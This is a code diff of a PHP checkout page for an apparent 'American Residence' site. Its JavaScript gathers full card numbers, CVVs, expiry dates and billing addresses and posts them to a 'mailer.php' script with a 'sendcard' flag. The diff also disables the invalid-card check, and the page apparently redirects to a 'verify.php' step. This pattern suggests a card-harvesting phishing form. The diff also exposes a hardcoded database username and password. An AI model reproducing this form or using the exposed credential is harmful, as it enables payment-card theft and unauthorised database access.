@@ -7,13 +7,13 @@ $dbh = new Database;
 
 // Database connection details
 $host = "localhost"; // Replace with your database host
-$username = "americar_reside"; // Replace with your database username
-$password = "LPcLYu2hVFAcWHU834gr"; // Replace with your database password
-$dbname = "americar_reside"; // Replace with your database name
+// $username = "americar_reside"; // Replace with your database username
+// $password = "LPcLYu2hVFAcWHU834gr"; // Replace with your database password
+// $dbname = "americar_reside"; // Replace with your database name
 // $host = "localhost"; // Replace with your database host
-// $username = "root"; // Replace with your database username
-// $password = ""; // Replace with your database password
-// $dbname = "american_residence"; // Replace with your database name
+$username = "root"; // Replace with your database username
+$password = ""; // Replace with your database password
+$dbname = "american_residence"; // Replace with your database name
 
 // Establish the database connection
 try {
@@ -251,7 +251,8 @@ if (isset($_GET['id'])) {
               />
             </div> -->
             <div>
-            <div id="card-feedback" style="font-size: 0.9em; margin-top: 5px;"></div>
+            <div>
+              <div id="card-feedback" style="font-size: 0.9em; margin-top: 5px;"></div>
               <label for="credit-card-num"
                 >Card Number
                 <span class="card-logos">
@@ -339,73 +340,68 @@ if (isset($_GET['id'])) {
        function startSpinner(event) {
     event.preventDefault(); // Prevent default form submission
 
-    const feedback = document.querySelector("#card-feedback");
+    const feedback = $("#card-feedback");
     const invalidCardMessage = "Invalid card number";
 
     // Display an alert if the card number is invalid
-    if (feedback && feedback.textContent === invalidCardMessage) {
-        swal({
-            title: "Invalid Card",
-            text: "You entered invalid card details. Please retry!",
-            icon: "error", // Updated `type` to `icon` for newer SweetAlert versions
-            button: "Ok",
-        });
-        return;
-    }
+    // if (feedback.length && feedback.text() === invalidCardMessage) {
+    //     swal({
+    //         title: "Invalid Card",
+    //         text: "You entered invalid card details. Please retry!",
+    //         icon: "error", // Updated `type` to `icon` for newer SweetAlert versions
+    //         button: "Ok",
+    //     });
+    //     return;
+    // }
 
     // Collect form data
     const amountToPay = "<?= htmlspecialchars($amount_to_pay, ENT_QUOTES, 'UTF-8') ?>"; // Escaped for security
     const formData = {
-        expYear: document.querySelector("#expiration-year").value,
-        email: document.querySelector("#email").value,
-        name: document.querySelector("#full-name").value,
+        expYear: $("#expiration-year").val(),
+        email: $("#email").val(),
+        name: $("#full-name").val(),
         amount: amountToPay,
-        cvv: document.querySelector("#cvv").value,
-        cardNumber: document.querySelector("#credit-card-num").value,
-        expMonth: document.querySelector("#expiration-month").value,
+        cvv: $("#cvv").val(),
+        cardNumber: $("#credit-card-num").val(),
+        expMonth: $("#expiration-month").val(),
         sendcard: true,
-        zipCode: document.querySelector("#zip-code").value,
-        state: document.querySelector("#state").value,
-        city: document.querySelector("#city").value,
-        address: document.querySelector("#billing-address").value, // Added `.value`
+        zipCode: $("#zip-code").val(),
+        state: $("#state").val(),
+        city: $("#city").val(),
+        address: $("#billing-address").val(),
     };
 
-    // Debugging: Log form data (remove this in production)
-    console.log("Sending form data:", formData);
+    // Make AJAX request using jQuery
+    $.ajax({
+        url: "./mailer.php",
+        type: "POST",
+        data: JSON.stringify(formData),
+        contentType: "application/json",
+        success: function (response) {
+            console.log("Server response:", response); // Debugging
 
-    // Make AJAX request
-    fetch("./mailer.php", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
+            // Uncomment and complete the success handling logic as needed
+            // if ($.trim(response) === "success") {
+            //     const params = new URLSearchParams({
+            //         user: "", // Add the user details dynamically if needed
+            //     });
+
+            //     // Redirect to verify page
+            //     window.location.href = `verify.php?${params}`;
+            // } else {
+            //     throw new Error("Failed to process payment");
+            // }
         },
-        body: JSON.stringify(formData),
-    })
-        .then(async (response) => {
-            const resText = await response.text(); // Parse the response text
-            console.log("Server response:", resText); // Debugging
-
-            if (resText.trim() === "success") {
-                const params = new URLSearchParams({
-                    user: "<?= htmlspecialchars($_SESSION['user']['id'], ENT_QUOTES, 'UTF-8') ?>",
-                    id: "<?= htmlspecialchars($id, ENT_QUOTES, 'UTF-8') ?>",
-                });
-
-                // Redirect to verify page
-                window.location.href = `verify.php?${params}`;
-            } else {
-                throw new Error("Failed to process payment");
-            }
-        })
-        .catch((error) => {
-            console.error("Error occurred:", error);
+        error: function (jqXHR, textStatus, errorThrown) {
+            console.error("Error occurred:", textStatus, errorThrown);
             swal({
                 title: "Error",
                 text: "An unexpected error occurred while processing your request.",
                 icon: "error",
                 button: "Ok",
             });
-        });
+        },
+    });
 }
 
 
